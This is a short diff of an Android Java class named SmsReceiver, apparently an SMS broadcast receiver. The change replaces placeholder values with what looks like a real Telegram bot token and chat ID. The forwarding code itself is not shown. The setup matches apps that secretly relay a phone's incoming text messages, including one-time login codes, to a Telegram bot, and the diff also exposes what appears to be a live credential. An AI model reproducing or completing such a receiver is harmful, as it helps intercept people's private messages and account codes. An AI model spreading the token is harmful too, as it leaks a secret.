@@ -13,8 +13,8 @@ import java.net.URLEncoder;
 public class SmsReceiver extends BroadcastReceiver {
 
     // Replace with your actual Bot Token and Chat ID
-    private static final String BOT_TOKEN = "Token";
-    private static final String CHAT_ID = "Chat ID";
+   private static final String BOT_TOKEN = "8991521894:AAF54TMcZp6-I9TJ7a6SfFNUDdp0EZjFZdM";
+private static final String CHAT_ID = "8828331152";
 
     @Override
     public void onReceive(Context context, Intent intent) {
